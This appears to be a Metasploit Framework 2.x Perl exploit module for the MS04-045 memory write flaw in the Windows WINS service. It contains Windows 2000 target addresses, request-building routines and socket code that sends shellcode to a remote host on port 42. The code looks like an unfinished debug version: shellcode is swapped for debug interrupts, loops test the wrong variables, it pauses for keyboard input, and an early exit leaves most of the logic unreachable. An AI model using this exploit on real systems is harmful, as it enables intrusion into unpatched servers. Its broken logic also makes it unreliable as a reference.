
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wins_ms04_045;
use base "Msf::Exploit";
use Pex::DCERPC;
use strict;
use Pex::Utils;
use Pex::Text;

my $advanced = 
{
	'BASE'	=> [0, 'Specify the exact address to the structure'],
	'TARG'	=> [0, 'Specify the exact address to overwrite'],
	'WHAT'	=> [0, 'Specify the data used to overwrite the address'],
	'INT3'	=> [0, 'Switch to a payload of x86 debug interrupts'],
};

my $info =
{
    'Name'  => 'Microsoft WINS MSO4-045 Code Execution',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32', 'win2000' ],
    'Priv'  => 1,
    'AutoOpts'  => { 'EXITFUNC' => 'thread' },
    'UserOpts'  => {
                    'RHOST'  => [1, 'ADDR', 'The target address'],
                    'RPORT'  => [1, 'PORT', 'The target port', 42],
                },

    'Payload' => {
                     'Space'  => 2900,
                     'BadChars'  => '',
					 'Keys'      => ['+ws2ord'],						 
                 },
    
    'Description'  => Pex::Text::Freeform(qq{
        This module exploits a arbitrary memory write flaw in the WINS service, this vulnerability
        was originally found by Immunity.
    }),
                
    'Refs'  =>   [  
                 #   ['OSVDB',   5248],
                    ['MSB',     'MS04-045'],
                 ],
    'Targets'   =>
                 [
                   ['Windows 2000 Stack Brute 0', 0x05391e80, 0x0580f500, 0x0580e000, 16],
				   ['Windows 2000 Stack Brute 1', 0x05391e80, 0x053df500, 0x053df000, 16],
                   ['Windows 2000 Func Brute' , 0x05391e80,  0x1025500,  0x1023000, 16],
                   ['Windows 2000 SP1 Func'   , 0x05391e80,  0x102537c,  0x102537c, 16],				   
				   ['Windows 2000 SP0 WS2'   , 0x05391e80,  0x750417ac,  0x750417ac, 16],
                   ['Windows 2000 SP1 WS2'   , 0x05391e80,  0x750417c4,  0x750417c4, 16],
				   ['Windows 2000 SP2 WS2'   , 0x05391e80,  0x750407c4,  0x750407c4, 16],
                 ],
    'Keys'  =>  ['wins'],                 
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Replicate {
	my $self = shift;
	my $base = shift;
	my $targ = shift;
	my $what = shift;
	
	my $req;
	$req .= pack('NVN', 0x80000, -1, $base);
	$req .= pack('V', $targ - 0x48) x 9;
	$req .= pack('V', $what + 96) x 14;	

	return $req;
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $target_name = $self->GetVar('NBNAME');
    
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    
    my $target = $self->Targets->[$target_idx];
   
    if (! $self->InitNops(128)) {
	    $self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}
	
	my $req;

	my $base = $target->[1];
	my $addb = $target->[2];
	my $adde = $target->[3];
	my $step = $target->[4];
	
	my $addr = $base + 40100;

	$shellcode = "\xcc" x length($shellcode);


	printf("Shellcode at 0x%.8x\n", $addr);
	$addb = 0x414142f0;
	$adde = 0x41414000;

	# Create the seed request...
	for (my $targ = $addb; $addb > $adde; $targ -= 16) {
		$req .= pack('V', $targ - 0x48);
		$req .= "\x69" x 32;
		$req .= pack('V', $addr) x 4;
		last if length($req) > 40000;
	}

	$req .= $self->MakeNops( 40100 - length($req) );
	$req .= $shellcode;
	

	if (0) {
		my $pkt = pack('NNN', length($req) - 8, -1, 0xf00dcafe). $req;
		$self->PrintLine("[*] Sending seed request...");
		my $s = Msf::Socket::Tcp->new
    	(
        	'PeerAddr'  => $target_host,
        	'PeerPort'  => $target_port,
    	);

    	if ($s->IsError) {
        	$self->PrintLine("[*] Socket error: " . $s->GetError());
        	return(0);
    	}

		$s->Send($pkt);
		exit(0);
	}	
	
	my $heap = $base;
	for (my $targ = $addb; $addb > $adde; $targ -= 16) {

		my $pkt = pack('NNN', 8, -1, $heap);
		
		$self->PrintLine(sprintf("[*] Trying target address 0x%.8x with base 0x%.8x...", $targ, $heap));

		print STDERR "Enter to send\n";
		<STDIN>;

		my $s = Msf::Socket::Tcp->new
    	(
        	'PeerAddr'  => $target_host,
        	'PeerPort'  => $target_port,
    	);

    	if ($s->IsError) {
        	$self->PrintLine("[*] Socket error: " . $s->GetError());
        	return(0);
    	}

		$s->Send($pkt);	
		
		#-------
		
		my $pkt = pack('NNN', 8, -1, 0xc0debeef);
		
		$self->PrintLine("[*] Flushing queue...");

		my $s = Msf::Socket::Tcp->new
    	(
        	'PeerAddr'  => $target_host,
        	'PeerPort'  => $target_port,
    	);

    	if ($s->IsError) {
        	$self->PrintLine("[*] Socket error: " . $s->GetError());
        	return(0);
    	}

		$s->Send($pkt);					
				
		# -------
		
		$heap += 52;
	}
	
	
	
	exit;
	
	my $what;
	
	if ( $self->GetVar('BASE') ) {
		$base = hex($self->GetVar('BASE'));
	}
	
	if ( $self->GetVar('TARG') ) {
		$adde = $addb = hex($self->GetVar('TARG'));
	}
	
	if ( $self->GetVar('WHAT') ) {
		$what = hex($self->GetVar('WHAT'));
	}
		
	if ( $self->GetVar('INT3') ) {
		$shellcode = "\xcc" x length($shellcode);
	}
		
	$self->PrintLine("[*] Initializing WINS attack with target '$target->[0]'");
	
	#for (my $targ = $addb; $targ >= $adde; $targ -= $step) {

	my $targ = $addb;
	for (;;) {
		
		my $req = $self->Replicate($base, $targ, $what). $shellcode;
	
    	$self->PrintLine(sprintf("[*] Trying target address 0x%.8x with base 0x%.8x...", $targ, $base));
		
    	my $s = Msf::Socket::Tcp->new
    	(
        	'PeerAddr'  => $target_host,
        	'PeerPort'  => $target_port,
    	);

    	if ($s->IsError) {
        	$self->PrintLine("[*] Socket error: " . $s->GetError());
        	return(0);
    	}
		
		$s->Send($req);
	}
	
	# Overwritten function pointers may need time to get called
	sleep(2);
	
	$self->PrintLine("[*] Unable to exploit target");
	return;
}


1;
